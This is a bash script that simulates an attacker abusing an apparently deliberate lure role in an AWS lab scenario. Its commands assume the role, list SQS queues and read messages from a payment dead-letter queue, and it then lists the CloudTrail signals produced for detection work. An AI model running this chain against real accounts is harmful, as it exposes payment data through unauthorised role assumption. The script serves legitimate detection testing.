#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 11 (SQS Payment Events DLQ Lure)
#
# This script walks through the attack chain step by step with colored output.
# It assumes the caller has valid AWS credentials for any identity in the account.
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 11 — ABUSE CHAIN"
echo "  SQS Payment Events DLQ Lure"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

# ---------------------------------------------------------------
step "2" "Assuming lure role: payment-queue-readonly-role"
# ---------------------------------------------------------------
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/payment-queue-readonly-role"
attack "sts:AssumeRole → ${ROLE_ARN}"

CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_ARN}" \
  --role-session-name "recon-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .SessionToken)
info "Role assumed successfully"

# ---------------------------------------------------------------
step "3" "Listing all SQS queues (sqs:ListQueues)"
# ---------------------------------------------------------------
attack "sqs:ListQueues"
aws sqs list-queues --output table
info "Target queues identified: prod-payment-events.fifo, prod-payment-events-dlq.fifo"

# ---------------------------------------------------------------
step "4" "Resolving queue URLs and attributes (sqs:GetQueueUrl, sqs:GetQueueAttributes)"
# ---------------------------------------------------------------
attack "sqs:GetQueueUrl → prod-payment-events-dlq.fifo"
DLQ_URL=$(aws sqs get-queue-url --queue-name "prod-payment-events-dlq.fifo" --query "QueueUrl" --output text)
info "DLQ URL: ${DLQ_URL}"

attack "sqs:GetQueueAttributes → ${DLQ_URL}"
aws sqs get-queue-attributes --queue-url "${DLQ_URL}" --attribute-names All --output json

# ---------------------------------------------------------------
step "5" "Reading messages off the dead-letter queue (sqs:ReceiveMessage)"
# ---------------------------------------------------------------
attack "sqs:ReceiveMessage → ${DLQ_URL}"
MESSAGES=$(aws sqs receive-message --queue-url "${DLQ_URL}" \
  --max-number-of-messages 10 --visibility-timeout 0 --output json)
MSG_COUNT=$(echo "${MESSAGES}" | jq '.Messages // [] | length')
info "Received ${MSG_COUNT} message(s) from the DLQ"
if [[ "${MSG_COUNT}" -gt 0 ]]; then
  echo "${MESSAGES}" | jq '.Messages[0].Body' | head -c 500
  echo ""
else
  warn "DLQ is empty — no failed payment events currently sitting there."
fi

# ---------------------------------------------------------------
step "6" "Confirming the live payment queue is visible but not readable for messages"
# ---------------------------------------------------------------
attack "sqs:GetQueueUrl → prod-payment-events.fifo"
LIVE_URL=$(aws sqs get-queue-url --queue-name "prod-payment-events.fifo" --query "QueueUrl" --output text)
attack "sqs:GetQueueAttributes → ${LIVE_URL}"
aws sqs get-queue-attributes --queue-url "${LIVE_URL}" --attribute-names All --output json
warn "This role's policy grants sqs:ReceiveMessage on the DLQ only — ReceiveMessage against"
warn "the live queue is expected to fail AccessDenied (not attempted here on purpose)."

# ---------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------
echo ""
step "7" "Cleaning up session"
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
info "Session credentials cleared"

echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Abuse chain complete${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated:${NC}"
echo "  • CloudTrail: AssumeRole on payment-queue-readonly-role"
echo "  • CloudTrail: ListQueues"
echo "  • CloudTrail: GetQueueUrl / GetQueueAttributes on both queues"
echo "  • CloudTrail: ReceiveMessage on prod-payment-events-dlq.fifo"
echo ""
